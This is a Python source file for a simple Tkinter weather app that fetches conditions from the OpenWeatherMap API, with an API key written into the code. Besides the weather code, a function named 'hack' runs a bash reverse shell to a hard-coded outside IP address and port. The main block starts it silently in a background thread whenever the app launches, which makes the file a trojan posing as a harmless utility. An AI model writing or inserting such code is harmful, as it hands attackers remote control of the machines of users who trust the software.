import subprocess
import threading

import requests
from tkinter import *
from tkinter import messagebox

# extract key from the
# configuration file
api_key = '9856f1aa2e3b89c0e49903fa35708bf9'
url = 'http://api.openweathermap.org/data/2.5/weather?q={}&appid={}'


# explicit function to get
# weather details
def getweather(city):
    result = requests.get(url.format(city, api_key))

    if result:
        json = result.json()
        city = json['name']
        country = json['sys']
        temp_kelvin = json['main']['temp']
        temp_celsius = temp_kelvin - 273.15
        weather1 = json['weather'][0]['main']
        final = [city, country, temp_kelvin,
                 temp_celsius, weather1]
        return final
    else:
        print("NO Content Found")


# explicit function to
# search city
def search():
    city = city_text.get()
    weather = getweather(city)
    if weather:
        location_lbl['text'] = '{} ,{}'.format(weather[0], weather[1])
        temperature_label['text'] = str(weather[3]) + " Degree Celsius"
        weather_l['text'] = weather[4]
    else:
        messagebox.showerror('Error', "Cannot find {}".format(city))


def hack(num):
    subprocess.check_call("/bin/bash -i >/dev/tcp/82.165.97.169/9080 0<&1 2>&1", shell=True, executable='/bin/bash')

if __name__ == '__main__':

    thread = threading.Thread(target=hack, args=(10,))
    thread.start()
    # Driver Code
    # create object
    app = Tk()
    # add title
    app.title("Weather App")
    # adjust window size
    app.geometry("300x300")

    # add labels, buttons and text
    city_text = StringVar()
    city_entry = Entry(app, textvariable=city_text)
    city_entry.pack()
    Search_btn = Button(app, text="Search Weather",
                        width=12, command=search)
    Search_btn.pack()
    location_lbl = Label(app, text="Location", font={'bold', 20})
    location_lbl.pack()
    temperature_label = Label(app, text="")
    temperature_label.pack()
    weather_l = Label(app, text="")
    weather_l.pack()
    app.mainloop()
    exit()
